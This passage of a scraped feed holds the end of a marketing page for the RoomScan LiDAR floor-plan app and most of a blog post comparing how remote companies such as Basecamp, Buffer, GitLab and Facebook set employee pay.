      &quot;systemDataVariants&quot;: &quot;2500x1667,100w,300w,500w,750w,1000w,1500w,2500w&quot;,
      &quot;systemDataSourceType&quot;: &quot;JPG&quot;,
      &quot;filename&quot;: &quot;RoomScan in use photo 5.jpeg&quot;,
      &quot;mediaFocalPoint&quot;: {
        &quot;x&quot;: 0.5,
        &quot;y&quot;: 0.5,
        &quot;source&quot;: 3
      },
      &quot;colorData&quot;: {
        &quot;topLeftAverage&quot;: &quot;95a9b7&quot;,
        &quot;topRightAverage&quot;: &quot;110c01&quot;,
        &quot;bottomLeftAverage&quot;: &quot;241d13&quot;,
        &quot;bottomRightAverage&quot;: &quot;151506&quot;,
        &quot;centerAverage&quot;: &quot;a9a099&quot;,
        &quot;suggestedBgColor&quot;: &quot;b8d3e6&quot;
      },
      &quot;urlId&quot;: &quot;jnpm5y97xro8cpo1zv7uw0t53e0yfc&quot;,
      &quot;title&quot;: &quot;&quot;,
      &quot;body&quot;: null,
      &quot;likeCount&quot;: 0,
      &quot;commentCount&quot;: 0,
      &quot;publicCommentCount&quot;: 0,
      &quot;commentState&quot;: 2,
      &quot;unsaved&quot;: false,
      &quot;author&quot;: {
        &quot;id&quot;: &quot;5f8ec0c3d0e044016ba3f020&quot;,
        &quot;displayName&quot;: &quot;Max Christian&quot;,
        &quot;firstName&quot;: &quot;Max&quot;,
        &quot;lastName&quot;: &quot;Christian&quot;,
        &quot;bio&quot;: &quot;&quot;
      },
      &quot;assetUrl&quot;: &quot;https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209432252-QIJC01U8MLQRF2HHFZF0/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/RoomScan+in+use+photo+5.jpeg&quot;,
      &quot;contentType&quot;: &quot;image/jpeg&quot;,
      &quot;items&quot;: [ ],
      &quot;pushedServices&quot;: { },
      &quot;pendingPushedServices&quot;: { },
      &quot;recordTypeLabel&quot;: &quot;image&quot;,
      &quot;originalSize&quot;: &quot;2500x1667&quot;
    },
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0
    },
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--medium&quot;,
    &quot;sectionTheme&quot;: &quot;dark&quot;,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-animation="none">
  <div>
  
     
      
      
        <p><img alt="" data-src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209432252-QIJC01U8MLQRF2HHFZF0/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/RoomScan+in+use+photo+5.jpeg" data-image="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209432252-QIJC01U8MLQRF2HHFZF0/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/RoomScan+in+use+photo+5.jpeg" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" data-load="false" src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209432252-QIJC01U8MLQRF2HHFZF0/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/RoomScan+in+use+photo+5.jpeg"></p>
    
  
  </div>
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5f8eea022948ee0cc871bded"><div><div><div data-block-type="2" id="block-c05454d18c336928ce94"><div><h2><strong>“You can trade your tape measure for this slick app called RoomScan“</strong></h2><p> — GIZMODO</p></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f8eea022948ee0cc871bde7" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0
    },
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5f8eea022948ee0cc871bde7"><div><div><div><div><div data-block-type="2" id="block-d8f9c3001103d9d3a582"><div><h3>LiDAR Technology</h3><p>LiDAR is used to determine distance by measuring how long it takes light to reach an object and reflect back. It’s so advanced, it’s being used by NASA for the next Mars landing mission, and it’s been engineered into the latest devices and the RoomScan LiDAR app for accurate laser measurements.</p></div></div></div><div><div data-block-type="2" id="block-bd10c3aafd21757a3228"><div><h3>A Simple Plan</h3><p>The RoomScan LiDAR app is as easy to use as tapping each wall, and swiping for doors and openings. LiDAR does the rest, enabling you to create an accurate floor plan in seconds. If you have an iPhone 12 Pro or 2020 iPad Pro, why not try it now, free of charge.</p></div></div></div><div><div data-block-type="2" id="block-b3a6e44198e97db0efe3"><div><h3>The Future, Today</h3><p>Minutes after installing RoomScan LiDAR, you’ll have your whole home as a 3D model ready to share by iMessage or on the web. And RoomScan isn’t needed to view — sharing uses standard formats USDZ &amp; PLY. Easily post the point cloud on sketchfab.com or email the textured 3D model to your architect.</p></div></div></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f8f1267cc230807a4b38818" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0
    },
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5f8f1267cc230807a4b38818"><div><div><div><div><div data-block-type="2" id="block-79dfb729972e093e0a17"><div><h3>Capture more than floor plans</h3><p>Ideal for property condition reports, take a photo with RoomScan LiDAR and its location is stored on the floor plan — you can even dictate notes onto the photo.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603209362721_11072"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209093995-X4TD30A899HEQU24H7VS/ke17ZwdGBToddI8pDm48kFMrOgOn1maB2MLcB9NqWX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UY1iaBa4nx-5OV4T01e7OC_MVM6eoyzIr4V4s5CzsVOKZDqXZYzu2fuaodM4POSZ4w/Screenshot+2020-10-20+at+16.50.45.png" data-image="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209093995-X4TD30A899HEQU24H7VS/ke17ZwdGBToddI8pDm48kFMrOgOn1maB2MLcB9NqWX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UY1iaBa4nx-5OV4T01e7OC_MVM6eoyzIr4V4s5CzsVOKZDqXZYzu2fuaodM4POSZ4w/Screenshot+2020-10-20+at+16.50.45.png" data-image-dimensions="2278x1198" data-image-focal-point="0.5,0.5" alt="Screenshot 2020-10-20 at 16.50.45.png" data-load="false" data-image-id="5f8f12f0cd094a75d8891110" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209093995-X4TD30A899HEQU24H7VS/ke17ZwdGBToddI8pDm48kFMrOgOn1maB2MLcB9NqWX57gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UY1iaBa4nx-5OV4T01e7OC_MVM6eoyzIr4V4s5CzsVOKZDqXZYzu2fuaodM4POSZ4w/Screenshot+2020-10-20+at+16.50.45.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-block-type="2" id="block-0e5dab64bbe8528c0141"><div><h3>Record everything in one place</h3><p>Annotate your plans with Apple® Pencil and you have plans, annotations, measurements, dictated notes and photos all in one place.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603209362721_12290"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209281289-XO05HO8AWMLU684F6YRL/ke17ZwdGBToddI8pDm48kGknLo77HxZRAEnSUZuVGgh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UQrMmiwzala1yMh4XEdnJTg4LZYEiFpiE6EQQ61ppC9oW07ycm2Trb21kYhaLJjddA/RoomScan+Pro+PencilKit+iPad+screenshot+1.png" data-image="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209281289-XO05HO8AWMLU684F6YRL/ke17ZwdGBToddI8pDm48kGknLo77HxZRAEnSUZuVGgh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UQrMmiwzala1yMh4XEdnJTg4LZYEiFpiE6EQQ61ppC9oW07ycm2Trb21kYhaLJjddA/RoomScan+Pro+PencilKit+iPad+screenshot+1.png" data-image-dimensions="1668x1718" data-image-focal-point="0.5,0.5" alt="RoomScan Pro PencilKit iPad screenshot 1.png" data-load="false" data-image-id="5f8f1300119d0d30b1d57944" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603209281289-XO05HO8AWMLU684F6YRL/ke17ZwdGBToddI8pDm48kGknLo77HxZRAEnSUZuVGgh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1UQrMmiwzala1yMh4XEdnJTg4LZYEiFpiE6EQQ61ppC9oW07ycm2Trb21kYhaLJjddA/RoomScan+Pro+PencilKit+iPad+screenshot+1.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div><div><div data-block-type="2" id="block-fdb1e531faa301d0c772"><div><h3>Is it a floor plan or is it a photo?</h3><p>Create a FLYPLAN® and a 3D model of the property and show it to clients as a scale model on their desktop.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1603209362721_13507"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603212368170-1QC6KJ2Q99QYVHJ3RY9R/ke17ZwdGBToddI8pDm48kJmdo3EfJZxV03x8f-bOqBN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USTOdoA0xHvhSitvZ14hYEIQ4MmW9qnUcPxckQRYTu2NH3bqxw7fF48mhrq5Ulr0Hg/FLYPLAN%C2%AE+single+room+example.png" data-image="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603212368170-1QC6KJ2Q99QYVHJ3RY9R/ke17ZwdGBToddI8pDm48kJmdo3EfJZxV03x8f-bOqBN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USTOdoA0xHvhSitvZ14hYEIQ4MmW9qnUcPxckQRYTu2NH3bqxw7fF48mhrq5Ulr0Hg/FLYPLAN%C2%AE+single+room+example.png" data-image-dimensions="1580x2000" data-image-focal-point="0.5,0.5" alt="FLYPLAN® single room example.png" data-load="false" data-image-id="5f8f1433fe7fd92b0c0d1867" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5f8ec0c6c23f6a1d09475dc8/1603212368170-1QC6KJ2Q99QYVHJ3RY9R/ke17ZwdGBToddI8pDm48kJmdo3EfJZxV03x8f-bOqBN7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USTOdoA0xHvhSitvZ14hYEIQ4MmW9qnUcPxckQRYTu2NH3bqxw7fF48mhrq5Ulr0Hg/FLYPLAN%C2%AE+single+room+example.png">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f905ff765ca8658062b5e6f" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0
    },
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5f905ff765ca8658062b5e6f"><div><div><div><div><div data-block-type="2" id="block-4f466f5e170167002c03"><div><h3>Floor plan export</h3><p>Here’s <a href="https://www.locometric.com/s/PDF-document-F69A050E93A1-1.pdf">a sample of a 2D floor plan</a> from RoomScan LiDAR. An enormous range of options are available to customise the plan and the displayed measurements. As well as PDF and PNG format, other formats include: </p><ul data-rte-list="default"><li><p>DXF format for CAD (<a href="https://www.locometric.com/s/713-Croft-Close-Chester-Rowton.dxf">sample</a>)</p></li><li><p>a property inventory in CSV format for spreadsheets</p></li><li><p>a PDF listing room details, photos &amp; notes</p></li><li><p>Metropix® format, used in the UK</p></li><li><p>FML, an XML-based format ideal for further processing</p></li></ul></div></div></div><div><div data-block-type="2" id="block-6cb152bd402898c2bf9f"><div><h3>Point cloud export</h3><p>RoomScan LiDAR creates a unified point cloud of all the rooms in one PLY file, ready for use with third party software or upload to 3D model sharing websites like sketchfab. Individual rooms can be exported too, if needed.</p><p>Here’s <a href="https://skfb.ly/6VOMJ">a sample point cloud</a> in PLY format created by RoomScan LiDAR in less than 60 seconds.</p></div></div></div><div><div data-block-type="2" id="block-9e92a07e176221f0f13e"><div><h3>How easy is it?</h3><p>Seeing how rooms are connected often helps demonstrate how easy it is to build a floor plan with RoomScan. This video shows how:</p></div></div></div></div></div></div></div>
    </div>
  </div>
</section>

  
</article>

          
          
          
        
      </main>
      

      
        
      
    </div></div>]]>
            </description>
            <link>https://www.locometric.com/lidar</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014935</guid>
            <pubDate>Sat, 07 Nov 2020 13:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compensation for Remote Teams]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014811">thread link</a>) | @chynkm
<br/>
November 7, 2020 | https://blog.remotive.io/compensation-for-remote-teams/ | <a href="https://web.archive.org/web/*/https://blog.remotive.io/compensation-for-remote-teams/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://blog.remotive.io/content/images/size/w300/2020/11/dumbo-5212670_1920.jpg 300w,
                            https://blog.remotive.io/content/images/size/w600/2020/11/dumbo-5212670_1920.jpg 600w,
                            https://blog.remotive.io/content/images/size/w1000/2020/11/dumbo-5212670_1920.jpg 1000w,
                            https://blog.remotive.io/content/images/size/w2000/2020/11/dumbo-5212670_1920.jpg 2000w" sizes="(max-width: 800px) 400px,
                            (max-width: 1170px) 700px,
                            1400px" src="https://blog.remotive.io/content/images/size/w2000/2020/11/dumbo-5212670_1920.jpg" alt="How to Structure Compensation for Remote Teams around the World">
            </figure>

            <section>
                <div>
                    <p>Let’s talk about compensation for distributed teams!</p><p>You’re in the right place if you’re asking yourself <strong>ANY</strong> of the following questions:</p><ul><li>Why is distributed compensation so complicated?</li><li>How do other distributed teams solve this?</li><li>What can I do to fix/update my policy?</li></ul><p>Also, this article will <strong>NOT</strong> be covering:</p><ul><li>How to build a salary calculator. Check out <a href="https://about.gitlab.com/handbook/total-rewards/compensation/compensation-calculator/">GitLab</a>, they mastered it!</li><li>How much you should pay employees. That’s on you to decide :)</li><li>How to hire internationally. That’s <a href="https://blog.remotive.io/employ-pay-remote-employees-around-the-world/">another conversation</a>...<br></li></ul><p>Let's start by considering two scenarios here, just for fun:</p><p><em>Scenario 1</em> - Bob is a senior software developer who has worked with some of the best companies. He currently lives in SF making $150,000/yr. He decides he wants a change and moves to Prague. &nbsp;His company would like to adjust his salary to $75,000/yr like other senior software developers that have worked at top companies.</p><p><em>Scenario 2</em> - &nbsp;Michael is a senior software developer who has worked with some of the best companies. He currently lives in Prague making $75,000/yr. He decides he wants a change and moves to SF. &nbsp;His company understands they need to adjust his salary to $150,000 to match the cost of living.</p><ul><li>Is this fair? What’s fair? With either move:</li><li>Does Bob become half as valuable to the company overnight?</li><li>Alternatively, does Michael become twice as valuable to the company?</li><li>Should a company pay someone according to local rates? Cost of living? Pay everyone the same?</li></ul><p>In my experience, compensation policy is linked to company culture. And no company culture ever satisfies everyone, here's a quote from <a href="https://tomtunguz.com/no-rules-rules/">Tom Tunguz</a>:</p><blockquote><em>“No culture satisfies everyone. And that’s exactly the point: cultures are meant to find, keep, and reward the people who belong in a group.”</em></blockquote><p>My point is this: </p><p>Setting your compensation policy will attract criticism no matter what you decide.</p><p>Some people will feel it’s too open/secretive, too stingy/generous, too complex… you get the point.</p><p>It’s impossible to simply hand-over a policy that you can copy-and-paste for your company. You have to find the policy that is right for you!</p><p><em>Why am I telling you about this? </em></p><p>I’ve been there. I worked at <a href="http://buffer.com/">Buffer</a>, a remote startup. I helped their remote team to grow from 15 to 90 employees. As Director of Operations, I worked on distributed compensation.</p><p>Today, I lead <a href="http://remotive.io/">Remotive.io</a>. Our mission is to help hire remotely. I chat about compensation with leadership and People Ops teams, and I enjoy teasing remote teams:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">"We hire remotely (US only)"<br>is the new <br>"We don't ship internationally"</p>— Rodolphe Dutel (@rdutel) <a href="https://twitter.com/rdutel/status/1298150446075346944?ref_src=twsrc%5Etfw">August 25, 2020</a></blockquote>

</figure><p>So, the one thing that matters is to <strong>have a compensation policy that reflects your values.</strong> Do send a clear message to employees and applicants. At the end of the day, we all want to make employees feel they are part of our company's success.</p><h2 id="why-is-setting-compensation-so-hard">Why is setting compensation so hard?<br></h2><p><strong><strong><strong>How companies typically handle compensation: </strong><em><strong>“We offer competitive pay”.</strong></em></strong></strong></p><p>Most job descriptions mention <em>competitive pay,</em> which doesn’t mean much. </p><p>In reality, most small companies are winging compensation and pay ad-hoc. Large companies often rely on salary data purchased from third-party providers and negotiate for key roles. At Remotive, we enjoy <a href="http://remotive.io/salaries">crowd-sourcing</a> salary information. </p><p>Applicant-facing compensation policies are rare. Ask other People Operations professionals. They’ll say “it’s complicated” and that’s the end of it mostly because current salaries were decided outside of any policy and it feels hard to re-examine those.</p><p>Also, compensation is an emotional topic. Check this out:</p><figure><blockquote data-width="550"><p lang="en" dir="ltr">Remote companies using locally adjusted pay:</p>— Rodolphe Dutel (@rdutel) <a href="https://twitter.com/rdutel/status/1321432832418435072?ref_src=twsrc%5Etfw">October 28, 2020</a></blockquote>

</figure><p>Note that I asked about <em>fairness</em> here, which is related to how people FEEL about a topic. That’s bound to be different for everyone, yet be sure that everybody has an opinion on compensation.</p><ul><li><strong><strong><strong>How distributed teams typically handle compensation</strong></strong></strong></li></ul><p>Few remote teams are vocal about compensation. Most distributed companies pay people ad-hoc and enjoy paying less when they can. Others are going remote with the clear intent of cost-cutting.</p><p>Some companies - like Buffer - are transparent. Others aren’t. It’s up to each company, anything goes. </p><p>In fact, not all employees expect<em> full transparency</em> from employers, but nearly all expect <em>clarity</em>. Meaning, can the People Ops team explain <em>why</em> policies are the way they are? Rational matters.</p><p>Few more thoughts on how employees feel:</p><ul><li>Yes, employees know how much other employees are making.</li><li>Yes, employees worry that a new compensation model will reduce their pay.</li><li>No one likes hearing “you’re great at your job but you’re moving so we’ll pay you less”.</li><li>No one wants to feel like a second class citizen/employee. </li></ul><p>My sense is that compensation can’t be a taboo. If you’re not addressing it, employees are.</p><h2 id="1-sf-pay-for-everyone-basecamp-"><br>1) SF-Pay for everyone: Basecamp.<br></h2><figure><img src="https://lh5.googleusercontent.com/LHBL1CdQjuwmxgVKQshlRs0lgxRCsVWyFNuIVkmMmr3gYjNN54zhHeUfJKDIJqTDApCXWhGm-W8bOlytIF2bOTZoBds9zpzzKhyRW6xRNZfRmlS_FQYre_Z21XigKVvM9dRo6_SZ" alt=""><figcaption>Basecamp has one of the most generous compensation policies.</figcaption></figure><p>A few highlights:</p><ul><li>Basecamp hires employees from anywhere in the world.</li><li>$400,000 life insurance/AD+D and 6% matching 401k.</li><li>Pay is in the top 10% of the San Francisco market, based on skills and experience.</li><li>10% Profit sharing, learning budget… <a href="https://basecamp.com/handbook/08-benefits-and-perks">More over here.</a><br></li></ul><p>Let’s add some colors here. Basecamp made $25m in <a href="https://www.forbes.com/companies/basecamp/?sh=48b832ba47b7">2017</a> and is growing like crazy. They employ around 50 people. To be extremely conservative, that’s $500,000 revenue per employee per year. Ah, I can hear VCs salivating as I type this..</p><p>Yes, Basecamp is generous. If your company is enjoying similar margins and growth, congratulations, feel free to do the same! Otherwise, please assume you’re not Basecamp. </p><p>Of course you can be generous, you’re just likely to be working with a lesser budget, and that’s okay too.</p><h2 id="2-formula-led-compensation-buffer-gitlab-helpscout-"><br>2) Formula-led compensation: Buffer, GitLab, HelpScout…<br></h2><p>Most companies want compensation to be fair and equal. But fairness and equality aren’t always the same thing, as this great graphic shows:</p><figure><img src="https://lh4.googleusercontent.com/BwrVFUNbVHuU0f2VhjzJGlZvYZ-vZWISpI4C0HOum_VUcZEsq6nDFQGp5rZEOrIyaq5uk0XqziPuSuL401t9Ur5QAzNguEgZOIgOsvcZivCr9Ls_YOh12MybRZHbIqNRFzysSGJ6" alt=""></figure><p>So, what’s fair? Is paying top dollar according to the SF standard fair? Is paying top dollar according to the local market fair? You can argue it many different ways.</p><p>Buffer introduced its salary formula back in 2013. They kept evolving it each and every year, and it will probably always be work in progress.</p><p><em>Notable addition</em>: Every time Buffer updates its formula, it “grandfathered” employees into the new formula. This meant employees wouldn’t start making less money because Buffer decided the formula had to change. This was a huge stress-relief among the team.</p><figure><img src="https://lh5.googleusercontent.com/AaVV7VMuH5fxDfDgQVwItW_TVmRM1-qySKMRBhZzCgcV6VJRYZ57bstVr8ya6fZnzGrEJHtTW3R20-A10kwqynV5L8TGKIaYHAEd-4l_Q-j4gyJ0fOnbPvHh2RLy55wIjeH24bdQ" alt=""><figcaption>Buffer Salary formula, circa 2014</figcaption></figure><p><br>Many more teams came up with salary calculators. The best one out there is probably GitLab. They are extremely thorough and meticulous around compensation. Much more can be found on their site.</p><figure><img src="https://lh5.googleusercontent.com/iwHnNDPAL0n1_mnhkmjsATtkEUo5ArwY9DfqoLe2Sqjx90_RfKbbwMYH2Mo6UrAX6oW2pnZGcuBXMTTAzqF3gwMr2Wzr6Q0M5bozeifLFBFKPyohNfE0C4IrB0II6BFjmM9ywmp8" alt=""><figcaption>GitLab gave Compensation calculators a lot of thoughts.</figcaption></figure><p><strong>GitLab</strong> took the following stance: <em>“We are paying local rates based on cost of market (also referred to as cost of labor). There is no cost of living input in our compensation philosophy.”</em></p><p><em>Notable exception</em>: Executive Compensation (VP and above) is derived outside of the GitLab Compensation Calculator. This gives GitLab some wiggle room to negotiate top talent when needed.<br></p><p><strong>HelpScout</strong> took a cultural stance, which I like. Here’s what Nick Francis, HelpScout CEO, had to say: </p><p><em>“Our formula pays between the top 10-25% depending on the role. We align with the “second tier” markets such as Boston, New York, and Seattle.”</em></p><figure><img src="https://lh6.googleusercontent.com/3vv4u4OuR2PYbPDaZ9TUE6klfRb_SIOIu4ojjlscEuDXTNGiXF-NYjZT3XQvsmLKFYiEcH1G5Z2fjWX4Z36WpfW4f2sQqQUYazujqYuegVgHpKGl9hsvgkum6L5vO7UHNvq0fTmI" alt=""><figcaption><strong>HelpScout</strong> took a cultural stance</figcaption></figure><p>I like that HelpScout knows they can’t / won’t compete in SF-based crazy high salary competition,so they are aligning in some other way. Again, they bring clarity to employees and applicants by having a simple and open stance.</p><h2 id="3-geo-arbitrage-compensation-facebook-vmware-">3) Geo-arbitrage compensation: Facebook, VMware…<br></h2><figure><img src="https://lh6.googleusercontent.com/ZKWv4Y6VCh8GfgxbU-bkIjWXK7181ZniPn-PW9pA_XQpZbZaj4Zc-BcDGWSkNSQAA0jHBnZjbeK4KhSbQiSQ4ZR9CeMSFUCXTIr81ME5zCq0F6tQgWpywCLU03bE_yJsp9P7X96NhRs" alt=""></figure><p>In 2020, Mr. Zuckerberg said Facebook would be “the most forward-learning company on remote work at our scale”. Then Zuck also said “staff salaries could be adjusted to align with the cost of living in their chosen location.”</p><p>People hated that. Medium posts calling Facebook’s New Remote Salary Policy “Barbaric” received 11,000+ claps. Why? Because expectations were mismanaged.</p><p>Let’s recap: Facebook said they’ll be the best in remote, not knowing what the standard was, then fell short. Whoopsy!</p><p>Facebook isn’t alone. WMware announced a similar policy, &nbsp;and more large companies share their viewpoint. </p><p>F500 companies LOVE location-adjusted pay. It’s the only thing they have ever known.</p><p>At GAFAM, compensation (salary, benefits, perks) gets adjusted every time you move countries. It’s how they have been operating for the last 30+ years.</p><p>Most large companies will mirror what has worked for them in the past. One way to look at it is that it’s pretty hard to change your entire compensation policy at a 50,000+ employees publicly traded company. Merely thinking about it is enough to make your CFO sweat.</p><h2 id="4-honorable-mentions-stripe-reddit-zapier">4) Honorable mentions: Stripe, Reddit, Zapier<br></h2><p>A few companies are trying to bring more/different thoughts around compensation. I wanted to share some of those with you:</p><p><strong>Stripe hands out relocation bonuses.</strong></p><p>Stripe opened a dedicated remote engineering HUB in <a href="https://stripe.com/blog/remote-hub">2019</a>. In 2020, they said office-based employees could go remote and leave the office through a framework: Salaries may get <a href="https://www.bloomberg.com/news/articles/2020-09-15/stripe-employees-who-relocate-to-get-20-000-bonus-and-a-pay-cut">cut by as much as 10%</a>. Those who relocate will get a $20,000 bonus. In this example, everyone can understand clear guidelines, so employees expectations were managed.</p><p><strong>Reddit eliminated geography compensation zones in the US.</strong></p><p>Reddit now allows 600+ employees to <a 